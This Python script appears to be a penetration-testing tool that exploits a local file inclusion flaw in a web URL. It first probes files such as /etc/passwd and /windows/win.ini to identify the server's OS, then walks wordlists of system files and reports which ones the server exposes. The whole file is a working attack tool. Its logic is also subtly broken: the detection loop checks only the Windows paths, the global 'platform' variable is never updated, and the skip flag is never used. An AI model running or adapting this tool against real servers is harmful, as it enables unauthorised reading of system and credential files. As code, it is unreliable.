#!/bin/python3

# A simple script to enumerate common files on a system and return whether they are present
#
# Windows file paths are taken from:
#   https://raw.githubusercontent.com/soffensive/windowsblindread/master/windows-files.txt
#
# Linux file paths are taken from:
#   https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list

import requests
import argparse

# --- Global Variables --- #

options = {}
platform = 'windows'
session = requests.session()
session.proxies = {
        'http' : "127.0.0.1:8080",
        'https' : "127.0.0.1:8080"
        }
session.timeout = 3

# Ref: https://github.com/psf/requests/blob/c45a4dfe6bfc6017d4ea7e9f051d6cc30972b310/requests/adapters.py#L106
# Fixes issues when proxy servers reset the connection
adapter = requests.adapters.HTTPAdapter(max_retries=3)
session.mount("http://",adapter)

def parse_args():
    parser = argparse.ArgumentParser(description='Test if files are present using LFI')
    parser.add_argument('--unix', help='Used to specify Unix server', action='store_true')
    parser.add_argument('--windows', help='Used to specify Windows server', action='store_true')
    parser.add_argument('--skip-test', help='Skip OS tests', action='store_true')
    parser.add_argument('--file', help='File to read paths from')
    parser.add_argument('url', help='The URL that is vulnerable to LFI')

    global options
    options = vars(parser.parse_args())

# Returns true if the file was found on the server
def test_file(f):
    url = options['url'] + f
    res = session.get(url)
    if 200 <= res.status_code and res.status_code < 400:
        return True
    return False

def test_lfi():
    w_paths = ['/boot.ini', '/windows/win.ini']
    u_paths = ['/etc/passwd', '/etc/hosts']
    paths = []

    if options['windows']:
        print("[*] Testing using windows paths")
        paths = w_paths
    elif options['unix']:
        print("[+] Testing using unix paths")
        paths = u_paths
    else:
        print("[+] Determining whether the server is running Windows or Unix")
        paths = w_paths + u_paths

    for path in w_paths:
        if test_file(path):
            if path in w_paths:
                print("[+] Webserver is running Windows")
            else:
                print("[+] Webserver is running Unix")
                platform = "unix"
            return
    print("[+] Webserver doesn't appear to be vulnerable. Tried the following files:")
    for p in paths:
        print("\t{0}".format(p))
    print("Run with --skip if you know it is")
    exit(1)

def run_lfi():
    f = None
    if options['file']:
        f = options['file']
    elif platform == 'windows':
        print("[*] No file was specified, reading from ../res/windows-files.txt")
        f = '../res/windows-files.txt'
    else:
        print("[*] No file was specified, reading from ../res/linux-files.txt")
        f = '../res/linux-files.txt'

    with open(f, 'r') as fh:
        paths = [ fh.strip() for fh in fh.readlines() ]

    print("[*] Testing a total of {0} files\n".format(len(paths)))
    for path in paths:
        if test_file(path):
            print("{0}".format(path))

def main():
    parse_args()
    test_lfi()
    run_lfi()

main()

